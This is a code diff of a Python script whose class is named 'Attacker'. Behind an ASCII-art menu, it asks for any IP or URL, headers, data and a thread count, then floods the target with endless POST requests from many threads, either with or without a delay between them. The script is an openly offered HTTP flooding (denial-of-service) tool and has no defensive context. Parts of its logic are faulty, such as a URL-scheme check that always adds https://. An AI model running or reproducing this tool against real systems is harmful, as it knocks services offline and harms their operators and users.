@@ -2,84 +2,102 @@ import requests as r
 import threading 
 import aiohttp
 import traceback
+import time
 
 class Attacker:
     
-    def __init__(self, thread_range: int = 0):
-        self.thread_range = thread_range
-        self.ses = aiohttp.ClientSession
+    def __init__(self, thread_len: int = 0):
+        self.thread_len = thread_len
 
     def post(self, url: str, headers: dict = {}, data: dict = {}):
-        if self.loop_range == 0:
-            r.post(url, headers)
-            print(f'Sent request to {url} using Headers: {headers}.')
-            return
-        else:
-            threads = []
-            def post_loop():
-                while True:
-                    try:
+        try:
+            if self.thread_len == 0:
+                r.post(url, headers=headers, data=data)
+                print(f'Sent request to {url} using Headers: {headers} and Data: {data}')
+                return
+            else:
+                threads = []
+                def post_loop():
+                    while True:
                         r.post(url, headers=headers, data=data)
-                        print(f'Sent request to {url} using Headers: {headers}.')
-                    except Exception:
-                        print(traceback.print_exc())
+                        print(f'Sent request to {url} using Headers: {headers} and Data: {data}')
+                    
+                for thread in range(self.thread_len):
+                    th = threading.Thread(target=post_loop, daemon=True)
+                    threads.append(th)
+
+                for thread in range(self.thread_len): ## Starting threads in the threads list
+                    threads[thread].start()
+
+                for thread in range(self.thread_len): 
+                    threads[thread].join()
+
+        except Exception:
+            print(traceback.format_exc())
+            
+
+    def aiopost(self, url: str, headers: dict = {}, data: dict = {}, rate: float = 0.0):
+        try:
+            if self.thread_len == 0:
+                r.post(url, headers=headers, data=data)
+                print(f'Sent request to {url} using Headers: {headers} and Data: {data}')
+            else:
+                threads = []
+
+                def aiopost_loop():
+                    while True:
+                        r.post(url, headers=headers, data=data)
+                        print(f'Sent request to {url} using Headers: {headers} and Data: {data}')
+                        time.sleep(rate)
                         
-            for thread in range(self.thread_range):
-                th = threading.Thread(target=post_loop, daemon=True)
-                threads.append(th)
+                for thread in range(self.thread_len):
+                    th = threading.Thread(target=aiopost_loop, daemon=True)
+                    threads.append(th)
 
-            for thread in range(self.thread_range): ## Starting threads in the threads list
-                threads[thread].start()
+                for thread in range(self.thread_len): ## Starting threads in the threads list
+                    threads[thread].start()
 
-            for thread in range(self.thread_range): 
-                threads[thread].join()
-    
-    async def aiopost(self, url: str, headers: dict = {}, data: dict = {}):
-        if self.loop_range == 0:
-            await self.ses.post(url, headers=headers, data=data)
-            print(f'Sent request to {url} using Headers: {headers}.')
-            return
-        else:
-            threads = []
-            def post_loop():
-                while True:
-                    r.post(url, headers)
-                    print(f'Sent request to {url} using Headers: {headers}.')
-
-            for thread in range(self.thread_range):
-                th = threading.Thread(target=post_loop, daemon=True)
-                threads.append(th)
-
-            for thread in range(self.thread_range): ## Starting threads in the threads list
-                threads[thread].start()
-
-            for thread in range(self.thread_range): 
-                threads[thread].join()
-
+                for thread in range(self.thread_len): 
+                    threads[thread].join()
+        
+        except Exception:
+            print(traceback.format_exc())
+            
 def Cor():
     choice = input("""
-   _,.----.     _,.---._                 
- .' .' -   \  ,-.' , -  `.   .-.,.---.   
+  _,.----.     _,.---._                 
+.' .' -   \  ,-.' , -  `.    ,.-.---._  
 /==/  ,  ,-' /==/_,  ,  - \ /==/  `   \  
 |==|-   |  .|==|   .=.     |==|-, .=., | 
 |==|_   `-' \==|_ : ;=:  - |==|   '='  / 
 |==|   _  , |==| , '='     |==|- ,   .'  
 \==\.       /\==\ -    ,_ /|==|_  . ,'.  
- `-.`.___.-'  '.='. -   .' /==/  /\ ,  ) 
+`-.`.___.-'  '.='. -   .' /==/  /\ ,  ) 
                 `--`--''   `--`-`--`--' 
     Async or Sync?: (Async/Sync) """)
-    url = input("What ip/url do you wanna send requests to?: ")
-    headers = input("Headers, dict format: ") 
-    thread_range = input("At what rate is requests going to be sent to this endpoint: ")
-    if choice.lower() == 'sync':
-        if loop_range:
-            Attacker(Loop_range=int(loop_range)).post(url, headers)
-        Attacker().post(url, headers)
-    elif choice.lower() == 'async'
-        if thread_range:
-            await Attacker(thread_range=int(thread_range)).aiopost(url, headers)
-        await Attacker().aiopost(url, headers)
+    url = input("What ip/url do you wanna send requests to?: (Needed) ")
+    headers = input("Headers, dict format: (Enter/{}) ") 
+    data = input("Data, dict format: (Enter/{}) ")
+    thread_len = input("Do you want to loop this request infinitely? If so, on how many threads: (Enter/Int) ")
+    
+    if not url.startswith('https://') or not url.startswith('http://'):
+        url = f'https://{url}'
+
+    if choice.lower() in ['sync', 'synchronous']:
+        if thread_len:
+            Attacker(thread_len=int(thread_len)).post(url, headers, data)
+
+        Attacker().post(url, headers, data)
+
+    elif choice.lower() in ['async', 'asynchronous']:
+        rate = input("Now that you have chosen the amount of threads you run requests on, at what rate?: (Enter/Float[seconds]) ")
+        if thread_len:
+            Attacker(thread_len=int(thread_len)).aiopost(url, headers, data, float(rate))
+
+        Attacker().aiopost(url, headers, data, float(rate))
     else:
-        print('Accepted ')
+        print('Accepted inputs are async, sync, asynchronous, synchronous (Cap insensitive).')
+
 if __name__ == "__main__":
     Cor()
+   
